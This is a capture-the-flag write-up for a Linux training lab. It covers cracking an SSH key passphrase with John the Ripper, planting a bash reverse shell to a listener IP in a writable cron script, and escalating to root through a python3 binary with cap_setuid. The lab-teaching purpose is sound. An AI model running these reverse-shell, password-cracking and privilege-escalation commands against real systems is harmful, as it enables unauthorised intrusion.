Mission Scenario

This is the Capstone Challenge for Ryan's Hacking Linux course on Simply Cyber Academy. As a result, this lab isn't strictly focused on realism, but rather teaching proper enumeration, lateral movement, and privilege escalation on a Linux machine.

There are 6 flags on the machine (you can see the location of each by clicking the 'hint' button to make it less of a rabbit chase). There are also multiple ways to solve the machine... so if you solve it in one way, you can go back and see if you can find the 2nd way.

Happy hacking!

Exploitation

We will use SSH keys which we obtain earlier in the Enumeration phase to log in as user1.

But firstly we have to set-up permissions for id_rsa to be able use it:

> chmod 600 id_rsa
> ssh user1@ascension.hsm -i id_rsa
Enter passphrase for key 'id_rsa':

After that you can see the id_rsa key is protected with the passphrase. For this purpose I gonna use John the Ripper.

Crack the passphrase using John the Ripper:

  1. Extract the Hash: ssh2john to convert the private key file into a crackable hash format.

    > ssh2john id_rsa > hash.txt

  2. Crack the Hash: I tried pwlist.txt but it didnt work. So I will try rockyou.txt otherwise we can also use https://crackstation.net they have also big database of passwords.

    > sudo john -w /usr/share/wordlists/rockyou.txt hash.txt

We successfully cracked hash with rockyou.txt wordlist.

Potentially we can abuse these cronjob and move to user2. Because UID=1002 have user2, as you can saw from the ID command.

2026/01/29 22:56:01 CMD: UID=1002  PID=1663   | /bin/sh -c /tmp/backup.sh 
2026/01/29 22:56:01 CMD: UID=1002  PID=1664   | /bin/sh -c /tmp/backup.sh 
2026/01/29 22:56:01 CMD: UID=1002  PID=1665   | /bin/sh -c /tmp/backup.sh

If you dont know what is cronjob: Its running jobs on repeating schedule. So potentially we can abuse it to execute reverse shell. And gain access to user2.

Now add reverse shell in the backup.sh file.

#!/bin/bash

bash -c 'exec bash -i &>/dev/tcp/10.200.39.172/4444 <&1'

Also dont forget to make it executable:

user1@ip-10-0-19-75:/tmp$ chmod +x backup.sh

And set-up listener on our main machine on port 4444.

nc -lvnp 4444

After that we have to wait for the cronjob to get running, and potentially obtain ReverseShell for User2.

As you can see we successfully Gain Access to User2. But now our shell is unstable. To fix this problem we have multiple choices. But we are able to access .ssh file. So we can add our ssh-key into the .ssh file.

Linux capabilities allow a subset of root privileges to be assigned to specific files or processes. This is a common privilege escalation vector in CTFs. The getcap command was used to search the entire filesystem for binaries with set capabilities.

getcap -r / 2>/dev/null

user3@ip-10-0-19-75:/home/user2$ getcap -r / 2>/dev/null

/snap/core22/2111/usr/bin/ping cap_net_raw=ep

Here you can spot /home/user3/python3 cap_setuid=ep

It is a misconfiguration which we can use to privilege escalation. When we check GTOBins and navigate to cap_setuid we find this interesting way of how to make privilege escalation.

So when we run this command it should grant us root access:

./python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

But firstly we have to navigate in this directory where we have python3 /home/user3

We successfully obtain Root access. Now navigate to /opt/root and get the final flag for user6.

Attack Path Summary:


1. Anonymous FTP exposed password list
2. NFS share exposed SSH private key
3. Cracked SSH passphrase → user1
4. Writable cronjob → user2
5. Weak Password → ftpuser
6. Database credentials → user3
7. Misconfigured Linux capability → root
